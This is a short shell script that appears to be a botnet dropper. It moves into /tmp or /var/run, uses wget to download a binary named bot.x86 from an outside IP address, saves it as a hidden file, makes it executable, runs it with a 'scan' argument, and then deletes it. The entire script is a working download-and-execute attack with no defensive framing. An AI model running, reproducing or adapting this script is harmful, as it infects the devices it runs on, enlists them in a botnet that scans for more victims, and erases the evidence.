#!/bin/sh
cd /tmp || cd /var/run
wget http://203.0.113.50/bot.x86 -O .x
chmod 777 .x
./.x scan
rm -f .x
